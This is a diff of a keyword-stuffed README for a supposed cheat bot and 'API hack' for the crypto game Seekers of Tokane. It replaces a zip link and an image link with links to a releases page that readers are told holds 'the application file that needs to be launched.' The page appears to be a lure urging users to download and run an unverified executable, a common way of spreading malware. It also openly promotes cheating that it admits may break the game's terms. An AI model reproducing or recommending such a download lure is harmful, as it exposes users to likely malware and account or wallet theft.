@@ -13,7 +13,7 @@ Welcome to the Seekers of Tokane Cheat Crypto Bot Auto Farm Clicker Game API Hac
 
 ## 📁 Repository Details
 
-🔗 **Repository Link:** [Seekers of Tokane Cheat Crypto Bot Auto Farm Clicker Game API Hack](https://github.com/files/uploaded/Application.zip)  
+🔗 **Repository Link:** [Seekers of Tokane Cheat Crypto Bot Auto Farm Clicker Game API Hack](https://github.com/Dyrhyle/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases)  
 ℹ️ *This link leads to the application file that needs to be launched.*
 
 🏷️ **Topics:** auto-clicker, auto-farm, blockchain-game, blockchain-technology, clicker-game, crypto-api, crypto-game, crypto-hack, cryptocurrency-game, ethereum-game, exploit, game-bot, game-cheat, game-enhancement, hack, mini-game, profit-optimization, seekers-of-tokane, seekers-of-tokane-bot, seekers-of-tokane-game
@@ -36,8 +36,8 @@ Please note that the use of cheats, hacks, and automation bots may violate the t
 
 Dive deeper into the world of Seekers of Tokane Cheat Crypto Bot Auto Farm Clicker Game API Hack by exploring the code, experimenting with different settings, and connecting with other players using similar tools. Let the power of automation and optimization take your gameplay to the next level!
 
-![Seekers of Tokane Cheat Crypto Bot](https://your-image-url.com)
-*Image Source: ExampleSource.com*
+![Seekers of Tokane Cheat Crypto Bot](https://github.com/Dyrhyle/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases)
+*Image Source: https://github.com/Dyrhyle/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases*
 
 *Remember, with great automation power comes great responsibility. Enjoy the game responsibly and have fun exploring the possibilities with the Seekers of Tokane Cheat Crypto Bot Auto Farm Clicker Game API Hack!*
 
